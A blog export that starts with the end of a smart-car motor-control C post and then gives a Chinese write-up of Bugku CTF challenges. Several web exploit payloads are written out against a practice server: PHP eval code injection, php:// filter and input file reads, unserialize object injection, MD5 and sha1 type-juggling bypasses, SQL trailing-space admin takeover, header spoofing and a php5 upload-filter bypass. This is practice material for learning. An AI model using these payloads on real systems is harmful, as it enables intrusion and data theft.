gpio_init(PTI3, 1, 0); gpio_init(PTE1, 1, 1);//电机右正转 gpio_init(PTG7, 1, 0); //关于角度其实可能进行模糊处理，分成三层30，60，90，判断更靠近那个段，然后直接进行相应赋值 &#125; else if (vec_y &lt; 0) &#123; gpio_init(PTE3, 1, 0);//电机左反转 gpio_init(PTI3, 1, 1); gpio_init(PTE1, 1, 0);//电机右反转 gpio_init(PTG7, 1, 1); //偏向判断跟前进差不多 &#125; else if (vec_y == 0) &#123; //现在就只有两个方向，左或者右 //右 if (vec_x &gt;= 0) &#123; FTM_PWM_Duty(CFTM1, FTM_CH1, 400); &#125; //左 else &#123; FTM_PWM_Duty(CFTM1, FTM_CH1, 100); &#125; &#125; &#125;&#125;//测试电机的程序void testmotor()&#123; gpio_set(PTE3, 1, 1);//电机左初始化正转 E3 = 1 I3 = 0 正转 gpio_set(PTI3, 1, 0); gpio_set(PTE1, 1, 1);//电机右初始化正转 gpio_set(PTG7, 1, 0); //输出占空比为 65%的pwm波 ，貌似之前学长说过就是关于pwm波低于60%就不转来着 FTM_PWM_Duty(CFTM2, FTM_CH0, 650); FTM_PWM_Duty(CFTM2, FTM_CH2, 650);&#125;//测试舵机void testservo()&#123; //貌似只需要20%就能右转 FTM_PWM_Duty(CFTM1, FTM_CH1, 200);&#125; 关于蓝牙的串口调试 这部分还不明白（之后再整吧）]]></content>
      <categories>
        <category>Study</category>
      </categories>
      <tags>
        <tag>SmartCar</tag>
        <tag>IAR</tag>
        <tag>openmv</tag>
        <tag>daily_record</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-wp]]></title>
    <url>%2F2019%2F10%2F24%2FBugku-wp%2F</url>
    <content type="text"><![CDATA[bugku的部分wp MISC闪的好快 下载文件是一个动态二维码，扫描第一帧之后会返回一个S，所以猜测就是所有二维码的字符串就是flag，所以写个脚本： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105#-*- coding: UTF-8 -*- import osimport requestsimport sysfrom io import BytesIOfrom pyzbar import pyzbarfrom PIL import Image,ImageEnhance def analyseImage(path): ''' Pre-process pass over the image to determine the mode (full or additive). Necessary as assessing single frames isn't reliable. Need to know the mode before processing all frames. ''' im = Image.open(path) results = &#123; 'size': im.size, 'mode': 'full', &#125; try: while True: if im.tile: tile = im.tile[0] update_region = tile[1] update_region_dimensions = update_region[2:] if update_region_dimensions != im.size: results['mode'] = 'partial' break im.seek(im.tell() + 1) except EOFError: pass return results def processImage(path): ''' Iterate the GIF, extracting each frame. ''' mode = analyseImage(path)['mode'] im = Image.open(path) i = 0 p = im.getpalette() last_frame = im.convert('RGBA') try: while True: print "saving %s (%s) frame %d, %s %s" % (path, mode, i, im.size, im.tile) ''' If the GIF uses local colour tables, each frame will have its own palette. If not, we need to apply the global palette to the new frame. ''' if not im.getpalette(): im.putpalette(p) new_frame = Image.new('RGBA', im.size) ''' Is this file a "partial"-mode GIF where frames update a region of a different size to the entire image? If so, we need to construct the new frame by pasting it on top of the preceding frames. ''' if mode == 'partial': new_frame.paste(last_frame) new_frame.paste(im, (0,0), im.convert('RGBA')) new_frame.save('%s-%d.png' % (''.join(os.path.basename(path).split('.')[:-1]), i), 'PNG') i += 1 last_frame = new_frame im.seek(im.tell() + 1) except EOFError: pass def get_ewm(): """ 读取二维码的内容： img_adds：二维码地址（可以是网址也可是本地地址 """ for i in range(0,18): img_adds = "masterGO-"+str(i)+".png" #print(img_adds) if os.path.isfile(img_adds): # 从本地加载二维码图片 img = Image.open(img_adds) else: # 从网络下载并加载二维码图片 rq_img = requests.get(img_adds).content img = Image.open(BytesIO(rq_img)) # img.show() # 显示图片，测试 txt_list = pyzbar.decode(img) for txt in txt_list: barcodeData = txt.data.decode("utf-8") sys.stdout.write(barcodeData) def main(): #先将gif分解为单帧 #processImage('masterGO.gif') get_ewm() print("\n") if __name__ == "__main__": main() 得到flag:SYC{F1aSh_so_f4sT} 啊哒 用binwalk查看文件 发现有个压缩包，binwalk分离文件，直接分离文件 得到myzip，进行解压，发现需要密码，这个时候查看一些图片的具体信息，发现 将这部分16进制转成字符串，得到sdnisc_2018 输入，得到flag.txt， 得到flag{3XiF_iNf0rM@ti0n} come_game打开文件，发现： 打开游戏运行，界面如下 发现新生成了三个文件： 用winhex打开看看，最后发现是save1文件中，存储着关卡信息，更改2对应16进制，将32改为33 发现关卡发生改变，接着改到35时，出现flag: 所以flag为FLAG{6E23F259D98DF153} 白哥的鸽子下载下来一个jpg二进制文件，猜测可能是图片，改一下文件名， 放到linux下，binwalk查看一下隐藏文件，发现没有什么特殊的地方，用winhex打开， 在末尾发现一段可用字符串，可能被加密了，用各种基本解密方法尝试解密，发现是栅栏密码， 发现flag{w22_is_v3ry_cool} linux下载下来一个压缩包文件，然后在linux中进行解压，得到一个flag的二进制文件，使用cat进行捕捉，发现flag: 隐写3下载一个压缩包，打开发现里面有张图片 放到linux中尝试看看是否有隐藏文件，发现不能打开，所以猜测是CRC校验的问题，修改高度对应位置： 得到flag{He1l0_d4_ba1} 做个游戏(08067CTF)打开文件，一个java程序，运行： 题目描述说，60秒，后面的速度越来越快，不太行~ 尝试使用逆向工具， 代码文件里面翻阅，发现 得到flag{RGFqaURhbGlfSmlud2FuQ2hpamk=} 交上去发现不对，看其中被base64加密了，解密后flag{DajiDali_JinwanChiji} WebWeb2打开链接： 查看源码，查找flag KEY{Web-2-bugKssNNikls9100} 计算器打开链接，发现只能输入一位 按f12打开控制台，查看相关源代码，发现maxlen=1，将其改为2， 重新输入，结果21即可得到flag{CTF-bugku-0032} web基础$_GET打开链接,发现以下代码： 1234$what=$_GET['what'];echo $what;if($what=='flag')echo 'flag&#123;****&#125;'; 很简单就是用GET方法进行传值，注意在index.php界面进行传值，payload如下： http://123.206.87.240:8002/get/index.php?what=flag 得到flag{bugku_get_su8kej2en} web基础$_POST跟上题很像，只是传参方法换了，使用POST方法，使用hackbar，直接传参： 得到flag{bugku_get_ssseint67se} 矛盾打开链接，得到这个: 1234567$num=$_GET['num'];if(!is_numeric($num)) //num不能是个数字&#123;echo $num;if($num==1) //num需要等于1echo 'flag&#123;**********&#125;';&#125; ==是比较运算符号 不会检查条件式的表达式的类型，所以我们可以构造一组整数等于1的字符串payload如下：http://123.206.87.240:8002/get/index1.php?num=1s 得到flag{bugku-789-ps-ssdf} web3打开链接： 查看源码。发现一组编码： &amp;#75;&amp;#69;&amp;#89;&amp;#123;&amp;#74;&amp;#50;&amp;#115;&amp;#97;&amp;#52;&amp;#50;&amp;#97;&amp;#104;&amp;#74;&amp;#75;&amp;#45;&amp;#72;&amp;#83;&amp;#49;&amp;#49;&amp;#73;&amp;#73;&amp;#73;&amp;#125; unicode编码，解码得到KEY{J2sa42ahJK-HS11III} 域名解析 直接添加hosts文件，在尾部加上123.206.87.240 flag.baidu.com 在浏览器中输入：flag.baidu.com得到KEY{DSAHDSJ82HDS2211} 你必须让他停下打开链接，发现： 看源码，会发现图片一直在变，在这个页面一直刷新就行，就能得到flag 本地包含123456&lt;?php include "flag.php"; $a = @$_REQUEST['hello']; eval( "var_dump($a);"); show_source(__FILE__); ?&gt; 方法一：eval存在命令执行漏洞，使用hello构造payloadhttp://123.206.87.240:8003/index.php?hello=1);show_source(%27flag.php%27);var_dump(3 12345678910int(1) &lt;?php $flag = 'Too Young Too Simple'; # echo $flag; # flag&#123;bug-ctf-gg-99&#125;; ?&gt; int(3) &lt;?php include "flag.php"; $a = @$_REQUEST['hello']; eval( "var_dump($a);"); show_source(__FILE__); ?&gt; 方法二：http://123.206.87.240:8003/index.php?hello=1);include $_POST[&#39;f&#39;]; 在POST区域：f=php://filter/convert.base64-encode/resource=flag.php 方法三：直接将flag.php文件读入变量hello中?hello=get_file_contents(&#39;flag.php&#39;) 备份是个好习惯利用md5或者php中“==”的漏洞进行操作 1234567891011121314&lt;?phpinclude_once "flag.php";ini_set("display_errors", 0);$str = strstr($_SERVER['REQUEST_URI'], '?');$str = substr($str,1);$str = str_replace('key','',$str); //用空串覆盖key所以需要构造两个重复parse_str($str);echo md5($key1);echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123; echo $flag."取得flag";&#125;?&gt; 关键代码就是需要key1与key2的值相等，但是加密之前的值不同 md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的 1http://123.206.87.240:8002/web16?kkeyey1[]=something&amp;kkeyey2[]=nothing 如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。 1234567891011121314下列的字符串的MD5值都是0e开头的：QNKCDZO240610708s878926199as155964671as214587387as214587387ahttp://123.206.87.240:8002/web16?kkeyey1=QNKCDZO&amp;kkeyey2=240610708 秋名山老司机2s秒内需要计算出结果然后post value值上去，可以用脚本进行计算 123456789101112import requestsimport reurl='http://123.206.87.240:8002/qiumingshan/'r=requests.session()requestpage = r.get(url)ans = re.findall('&lt;div&gt;(.*?)=\?;&lt;/div&gt;', requestpage.text) #获取表达式#print("ans",ans)ans="".join(ans)#列表转为字符串post=eval(ans)#计算表达式的值data=&#123;'value':post&#125;#构造post的data部分flag=r.post(url,data=data)print(flag.text) 得到flag: Bugku{YOU_DID_IT_BY_SECOND} 速度要快 看看源代码，需要我们post一个margin值上去 尝试抓包，发送repeater一下，然后go，发现flag，base64解密 交上去，发现不对，然后将margin赋值，用post方法传上去，发现也不对，再go几次发现，flag值在变化..…..… 想想题目说速度要快，所以可能需要通过脚本进行传值 12345678910import requestsimport base64url="http://123.206.87.240:8002/web6/"r=requests.session()headers=r.get(url).headers #获取headermid=base64.b64decode(headers['flag'])mid=mid.decode()#为了下一步用split不报错，b64decode后操作的对象是byte类型的字符串，而split函数要用str类型的flag = base64.b64decode(mid.split(':')[1])#获得flag:后的值data=&#123;'margin':flag&#125;print (r.post(url,data).text)#post方法传上去 cookie欺骗 打开看是一堆字符串，而且是一组重复出现，尝试MD5解密，没有结果。之后看看url http://123.206.87.240:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ= filename后的好像是base64编码，尝试解码：keys.txt 也就是说我们可以通过filename来得到文件信息,而我们想得到flag可以尝试看一下后台index.php的源码，同样需要将iindex.php编码,用line控制行数可将其打印出。 http://123.206.87.240:8002/web11/index.php?line=1&amp;filename=aW5kZXgucGhw 使用脚本 12345import requestsfor i in range(30): url = "http://123.206.87.240:8002/web11/index.php?line="+str(i)+"&amp;filename=aW5kZXgucGhw" s = requests.get(url) print(s.text) 得到 123456789101112131415161718192021222324252627&lt;?phperror_reporting(0);$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");$line=isset($_GET['line'])?intval($_GET['line']):0;if($file=='') header("location:index.php?line=&amp;filename=a2V5cy50eHQ=");$file_list = array('0' =&gt;'keys.txt','1' =&gt;'index.php',);if(isset($_COOKIE['margin']) &amp;&amp; $_COOKIE['margin']=='margin')&#123;$file_list[2]='keys.php';&#125;if(in_array($file, $file_list))&#123;$fa = file($file);echo $fa[$line];&#125;?&gt; 我们可以尝试添加Cookie,然后将keys.php编码后传上去 得到flag:KEY{key_keys} nerve give up 还是看看源码： 所以访问下http://123.206.87.240:8006/test/1p.html 1234567891011121314151617181920&lt;HTML&gt;&lt;HEAD&gt;&lt;SCRIPT LANGUAGE="Javascript"&gt;&lt;!--var Words ="%3Cscript%3Ewindow.location.href%3D%27http%3A//www.bugku.com%27%3B%3C/script%3E%20%0A%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E" function OutWord()&#123;var NewWords;NewWords = unescape(Words);document.write(NewWords);&#125; OutWord();// --&gt;&lt;/SCRIPT&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;/BODY&gt;&lt;/HTML&gt; 得到一组base64加密字符串，注意这里%3D%3D-–%3E是url加密，解密的是==--&gt; 所以直接进行base64解密得到： 1234567891011121314151617181920212223";if(!$_GET['id'])&#123; header('Location: hello.php?id=1'); exit();&#125;$id=$_GET['id'];$a=$_GET['a'];$b=$_GET['b'];if(stripos($a,'.')) #寻找.在a中第一次出现的位置&#123; echo 'no no no no no no no'; return ;&#125;$data = @file_get_contents($a,'r');if($data=="bugku is a nice plateform!" and $id==0 and strlen($b)&gt;5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)&#123; require("f4l2a3g.txt");&#125;else&#123; print "never never never give up !!!";&#125;?&gt; 尝试直接访问f4l2a3g.txt文件，得到flag:flag{tHis_iS_THe_fLaG} welcome to bugkuctf打开链接，还是啥都没有，看看源代码 12345678910111213&lt;!-- $user = $_GET["txt"]; $file = $_GET["file"]; $pass = $_GET["password"]; if(isset($user)&amp;&amp;(file_get_contents($user,'r')==="welcome to the bugkuctf"))&#123; //user不为空且user=welcome to the bugkuctf echo "hello admin!&lt;br&gt;"; include($file); //hint.php &#125;else&#123; echo "you are not admin ! "; &#125; --&gt; 这里就要使用php伪协议了。这道题目为了解决第二个条件，要用到 “php://input”协议。大致的意思是让 txt=php://input ，之后在post过去一个字符串 http://123.206.87.240:8006/index.php?txt=php://input welcome to the bugkuctf //将其post上去 此时根据提示我们可以把包含的文件读出来了，这里要用到php的第二个伪协议：php://filter txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=hint.php（简单来说就是利用伪协议读取所包含文件的base64值） 123456789101112131415PD9waHAgIA0KICANCmNsYXNzIEZsYWd7Ly9mbGFnLnBocCAgDQogICAgcHVibGljICRmaWxlOyAgDQogICAgcHVibGljIGZ1bmN0aW9uIF9fdG9zdHJpbmcoKXsgIA0KICAgICAgICBpZihpc3NldCgkdGhpcy0+ZmlsZSkpeyAgDQogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgDQoJCQllY2hvICI8YnI+IjsNCgkJcmV0dXJuICgiZ29vZCIpOw0KICAgICAgICB9ICANCiAgICB9ICANCn0gIA0KPz4gIA== 解码：&lt;?php class Flag&#123;//flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; //如果文件为空， echo file_get_contents($this-&gt;file); echo "&lt;br&gt;"; return ("good"); &#125; &#125; &#125; ?&gt; 看看能不能直接读flag: 显然没有flag,所以不能直接访问。这个信息返回到index.php页面，所以讲hint.php改成index.php看看里面的信息。 123456789101112131415161718192021222324252627282930313233&lt;?php $txt = $_GET["txt"]; $file = $_GET["file"]; $password = $_GET["password"]; if(isset($txt)&amp;&amp;(file_get_contents($txt,'r')==="welcome to the bugkuctf"))&#123; echo "hello friend!&lt;br&gt;"; if(preg_match("/flag/",$file))&#123; echo "不能现在就给你flag哦"; exit(); &#125;else&#123; include($file); $password = unserialize($password); echo $password; &#125; &#125;else&#123; echo "you are not the number of bugku ! "; &#125; ?&gt; &lt;!-- $user = $_GET["txt"]; $file = $_GET["file"]; $pass = $_GET["password"]; if(isset($user)&amp;&amp;(file_get_contents($user,'r')==="welcome to the bugkuctf"))&#123; echo "hello admin!&lt;br&gt;"; include($file); //hint.php &#125;else&#123; echo "you are not admin ! "; &#125; --&gt; 我们发现当Flag方法当做字符串执行时，会自动执行 __tostring 方法，方法中写了如果file文件存在，那么就输出file文件中的内容。构造一个Flag类型的参数，并把这个参数传给password然后get进去。并且这个file的值要是hint.php（因为要利用hint.php中的函数） 12345678910&lt;?php class Flag&#123; public $file; &#125; $a = new Flag(); $a-&gt;file = "flag.php"; $a = serialize($a); print_r($a); ?&gt; O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;} 所以构造的url为：http://123.206.87.240:8006/index.php?txt=php://input&amp;file=hint.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;} 得到flag:flag{php_is_the_best_language} 字符？正则？ 利用正则匹配构造id的值，用GET方法传上去 12345678910111213/代表匹配的开始与结束两个/里面的内容就是要匹配的内容.代表数字匹配任意数字，*代表匹配0-n次两者结合.*就是匹配任一个数字任意次\表示要找\后面的内容，\/.\/就是找/数字/&#123;4,7&#125;表示匹配前一个字符4到7次[a-z]就是匹配a-z之间的字符[[:punct:]]代表任意标点i代表字体大小 前女友（SKCTF) 打开链接出现这个，查看源码， 点击一下，可以得到code.txt中的内容 123456789101112&lt;?phpif(isset($_GET['v1']) &amp;&amp; isset($_GET['v2']) &amp;&amp; isset($_GET['v3']))&#123; $v1 = $_GET['v1']; $v2 = $_GET['v2']; $v3 = $_GET['v3']; if($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123; if(!strcmp($v3, $flag))&#123; //相等返回0，不相等返回非0值 echo $flag; &#125; &#125;&#125;?&gt; 跟前面一道题很像，绕过md5，这里需要说一下就是strcmp在比较数组的时候返回应该是0，所以url构造如下：http://123.206.31.85:49162/index.php?v1=QNKCDZO&amp;v2=240610708&amp;v3[]=something 得到flag:SKCTF{Php_1s_tH3_B3St_L4NgUag3} login1(SKCTF) 随便注册一下，发现，无法登陆，发现可以注册账号，之后登陆发现需要获取管理员权限 在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。换句话说“vampire”等同于“vampire ”，对于绝大多数情况来说都是成立的（诸如WHERE子句中的字符串或INSERT语句中的字符串）例如以下语句的查询结果，与使用用户名“vampire”进行查询时的结果是一样的 SELECT * FROM users WHERE username=&#39;vampire &#39;; 在所有的INSERT查询中，SQL都会根据varchar(n)来限制字符串的最大长度。也就是说，如果字符串的长度大于“n”个字符的话，那么仅使用字符串的前“n”个字符。比如特定列的长度约束为“5”个字符，那么在插入字符串“vampire”时，实际上只能插入字符串的前5个字符，即“vampi”。 注意密码是大小字母还要加数字，还有admin后的空格需要足够多的。 我的注册是： 12admin 123QW123q 之后登陆就能得到flag:SKCTF{4Dm1n_HaV3_GreAt_p0w3R} 你从哪里来 伪造一下来源，改一下referer referer: https://www.google.com 得到flag{bug-ku_ai_admin} 目前遇到几个有关请求头的题，这里就稍微做一下总结 通用首部字段 请求首部字段 响应首部字段 md5 collision(NUPT_CTF) 根据题目所说，md5冲突，无非就是两个不同的值，但md5相等,所以先试试0e开头的 http://123.206.87.240:9009/md5.php?a=s878926199a 得到flag:flag{md5_collision_is_easy} 程序员本地网站 从本地访问，可以很清楚地看出，需要我们改一下X-Forwarded-For的值为：127.0.0.1 可以用burpsuite抓包，得到flag:flag{loc-al-h-o-st1} 各种绕过 打开链接会发现： 12345678910111213141516 &lt;?phphighlight_file('flag.php');$_GET['id'] = urldecode($_GET['id']); //url解码$flag = 'flag&#123;xxxxxxxxxxxxxxxxxx&#125;';if (isset($_GET['uname']) and isset($_POST['passwd'])) &#123; if ($_GET['uname'] == $_POST['passwd']) print 'passwd can not be uname.'; else if (sha1($_GET['uname']) === sha1($_POST['passwd'])&amp;($_GET['id']=='margin')) die('Flag: '.$flag); else print 'sorry!';&#125;?&gt; 首先id=urlencode(margin)=margin，uname不能和passwd相等，但是sha1之后要相等，sha1只对字符型进行处理，是数组的话返回false,注意是在index.php中传值。 所以payload:http://123.206.87.240:8002/web7/index.php?id=margin&amp;uname[]=something 还需要post：passwd[]=nothing 可以用hackbar完成操作，得到Flag: flag{HACK_45hhs_213sDD} web8 1234567891011121314151617&lt;?phpextract($_GET);if (!empty($ac))&#123;$f = trim(file_get_contents($fn));//trim() 函数移除字符串两侧的空白字符或其他预定义字符//file_get_contents() 函数把整个文件读入一个字符串中if ($ac === $f)&#123;echo "&lt;p&gt;This is flag:" ." $flag&lt;/p&gt;";&#125;else&#123;echo "&lt;p&gt;sorry!&lt;/p&gt;";&#125;&#125;?&gt; 题目中提出有txt文件，尝试1.txt,index.txt,flag.txt，最后发现flag.txt中有文件， 所以payload:http://123.206.87.240:8002/web8/index.php?ac=flags&amp;fn=flag.txt 得到flag:flag{3cfb7a90fc0de31} 细心 打开链接发现这样的页面： 我还以为这道题又被大佬们给干掉了，看了别人的博客发现可以做，那就接着走..…..… 查看源码，什么也没有。怎么办？？用御剑扫一下后台吧 发现可以访问，robots.txt，打开看看 接着做 题目是想办法变成admin，所以试试下面这个payload=http://123.206.87.240:8002/web13/resusl.php?x=admin 得到flag:flag(ctf_0098_lkji-s) 求getshell 打开链接， 大佬说的，如果是walf严格匹配，通过修改Content-type后字母的大小写可以绕过检测，使得需要上传的文件可以到达服务器端，而服务器的容错率较高，一般我们上传的文件可以解析。然后就需要确定我们如何上传文件，这里将文件的后缀名改为.jpg和.png都不可行，在分别将后缀名修改为php2, php3, php4, php5, phps, pht, phtm, phtml（php的别名），发现只有php5没有被过滤，成功上传，得到flag 先传一张图片，进行抓包，然后修改下面两个地方： filename 改为 1.php5 消息头中的Content-type将其后随便一个字母改为大写 Re入门逆向下载下来，查看一下文件类型： 32位应用程序，所以用ida打开： 发现一组ASCII码的数据，直接进行解码就行 flag{Re_1s_S0_C0oL} Easy_vb下载解题文件，查看一下文件类型： 用ida打开看看： 发现flag，看题目要求，flag最终为：flag{_N3t_Rev_1s_E4ay_} Easy_re下载解题文件后，先查看文件类型 运行试试： 现在用ida打开看看，容易找到相应位置 逆序，DUTCTF{We1c0met0DUTCTF}Easy_re 下载解题文件后，先查看文件类型 运行试试： 现在用ida打开看看，容易找到相应位置 逆序，DUTCTF{We1c0met0DUTCTF} 游戏过关方法一这是一道exe逆向问题，而网上大多教程都是用OD解题，此时我对OD的使用情况并不是特别的熟练，尝试用ida进行解题。 用ida打开， 尝试找到main函数，可以i搜索，在function中用CTRL+F进行搜索： 查看main函数： 读完函数逻辑，查看其中的if-else判断，经逐个测试，发现最终会进入到： 顺着思路，发现sub_45E940函数，打开查看逻辑： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121sub_45A7BE("done!!! the flag is "); v59 = 18; v60 = 64; v61 = 98; v62 = 5; v63 = 2; v64 = 4; v65 = 6; v66 = 3; v67 = 6; v68 = 48; v69 = 49; v70 = 65; v71 = 32; v72 = 12; v73 = 48; v74 = 65; v75 = 31; v76 = 78; v77 = 62; v78 = 32; v79 = 49; v80 = 32; v81 = 1; v82 = 57; v83 = 96; v84 = 3; v85 = 21; v86 = 9; v87 = 4; v88 = 62; v89 = 3; v90 = 5; v91 = 4; v92 = 1; v93 = 2; v94 = 3; v95 = 44; v96 = 65; v97 = 78; v98 = 32; v99 = 16; v100 = 97; v101 = 54; v102 = 16; v103 = 44; v104 = 52; v105 = 32; v106 = 64; v107 = 89; v108 = 45; v109 = 32; v110 = 65; v111 = 15; v112 = 34; v113 = 18; v114 = 16; v115 = 0; v2 = 123; v3 = 32; v4 = 18; v5 = 98; v6 = 119; v7 = 108; v8 = 65; v9 = 41; v10 = 124; v11 = 80; v12 = 125; v13 = 38; v14 = 124; v15 = 111; v16 = 74; v17 = 49; v18 = 83; v19 = 108; v20 = 94; v21 = 108; v22 = 84; v23 = 6; v24 = 96; v25 = 83; v26 = 44; v27 = 121; v28 = 104; v29 = 110; v30 = 32; v31 = 95; v32 = 117; v33 = 101; v34 = 99; v35 = 123; v36 = 127; v37 = 119; v38 = 96; v39 = 48; v40 = 107; v41 = 71; v42 = 92; v43 = 29; v44 = 81; v45 = 107; v46 = 90; v47 = 85; v48 = 64; v49 = 12; v50 = 43; v51 = 76; v52 = 86; v53 = 13; v54 = 114; v55 = 1; v56 = 117; v57 = 126; v58 = 0; for ( i = 0; i &lt; 56; ++i ) &#123; *(&amp;v2 + i) ^= *(&amp;v59 + i); *(&amp;v2 + i) ^= 0x13u; &#125; return sub_45A7BE("%s\n"); 写个python脚本： 12345678910#encoing=utf-8array1 = [0x12,0x40,0x62,0x5,0x2,0x4,0x6,0x3,0x6,0x30,0x31,0x41,0x20,0x0C,0x30,0x41,0x1F,0x4E,0x3E,0x20,0x31,0x20,0x1,0x39,0x60,0x3,0x15,0x9,0x4,0x3E,0x3,0x5,0x4,0x1,0x2,0x3,0x2C,0x41,0x4E,0x20,0x10,0x61,0x36,0x10,0x2C,0x34,0x20,0x40,0x59,0x2D,0x20,0x41,0x0F,0x22,0x12,0x10,0x0] array2 = [0x7B,0x20,0x12,0x62,0x77,0x6C,0x41,0x29,0x7C,0x50,0x7D,0x26,0x7C,0x6F,0x4A,0x31,0x53,0x6C,0x5E,0x6C,0x54,0x6,0x60,0x53,0x2C,0x79,0x68,0x6E,0x20,0x5F,0x75,0x65,0x63,0x7B,0x7F,0x77,0x60,0x30,0x6B,0x47,0x5C,0x1D,0x51,0x6B,0x5A,0x55,0x40,0x0C,0x2B,0x4C,0x56,0x0D,0x72,0x1,0x75,0x7E,0x0] flag = ""for i in range(0,0x38): flag += chr(array1[i]^array2[i]^0x13)print(flag) 得到zsctf{T9is_tOpic_1s_v5ry_int7resting_b6t_others_are_n0t} 方法二查看文件， 运行看看， 用OD打开，查找关键字符串,找到相应位置： 所以我们需要跳转到这来即可，现在我们重新查找关键字符串，找到输入的地方，下一个断点： 开始动态调试： 找到一个可以跳转的函数，将此处改为我们刚刚查找的地址： jle long 0141E968 取消断点，运行一下： 得到flag:zsctf{T9is_tOpic_1s_v5ry_int7resting_b6t_others_are_n0t} Timer一个apk文件，安装之后出现一个读秒的，用apktool进行反编译，查看 MainActivity函数。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586package net.bluelotus.tomorrow.easyandroid;import android.os.Bundle;import android.os.Handler;import android.support.v7.app.AppCompatActivity;import android.view.Menu;import android.view.MenuItem;import android.widget.TextView;public class MainActivity extends AppCompatActivity &#123; int beg = (((int) (System.currentTimeMillis() / 1000)) + 200000); int k = 0; int now; long t = 0; public native String stringFromJNI2(int i); public static boolean is2(int n) &#123; if (n &lt;= 3) &#123; if (n &gt; 1) &#123; return true; &#125; return false; &#125; else if (n % 2 == 0 || n % 3 == 0) &#123; return false; &#125; else &#123; int i = 5; while (i * i &lt;= n) &#123; if (n % i == 0 || n % (i + 2) == 0) &#123; return false; &#125; i += 6; &#125; return true; &#125; &#125; protected void onCreate(Bundle savedInstanceState) &#123; //调用父类Activity的onCreate()方法,超类继承防止递归调用 super.onCreate(savedInstanceState); //setContentView(R.layout.activity_main)这行代码，来将指定的资源xml文件加载到对应的activity setContentView((int) R.layout.activity_main); //文本框 final TextView tv1 = (TextView) findViewById(R.id.textView2); final TextView tv2 = (TextView) findViewById(R.id.textView3); //创建一个消息处理 final Handler handler = new Handler(); handler.postDelayed(new Runnable() &#123; public void run() &#123; MainActivity.this.t = System.currentTimeMillis(); MainActivity.this.now = (int) (MainActivity.this.t / 1000); MainActivity.this.t = 1500 - (MainActivity.this.t % 1000); tv2.setText("AliCTF"); if (MainActivity.this.beg - MainActivity.this.now &lt;= 0) &#123; tv1.setText("The flag is:"); tv2.setText("alictf&#123;" + MainActivity.this.stringFromJNI2(MainActivity.this.k) + "&#125;"); &#125; MainActivity mainActivity; if (MainActivity.is2(MainActivity.this.beg - MainActivity.this.now)) &#123; mainActivity = MainActivity.this; mainActivity.k += 100; &#125; else &#123; mainActivity = MainActivity.this; mainActivity.k--; &#125; tv1.setText("Time Remaining(s):" + (MainActivity.this.beg - MainActivity.this.now)); handler.postDelayed(this, MainActivity.this.t); &#125; &#125;, 0); &#125; public boolean onCreateOptionsMenu(Menu menu) &#123; getMenuInflater().inflate(R.menu.menu_main, menu); return true; &#125; public boolean onOptionsItemSelected(MenuItem item) &#123; if (item.getItemId() == R.id.action_settings) &#123; return true; &#125; return super.onOptionsItemSelected(item); &#125; static &#123; System.loadLibrary("lhm"); &#125;&#125; 解题待定..….我先去学下java 逆向入门下载得到一个admin.exe，运行提示，您的电脑版本不支持 file一下该文件，得到： 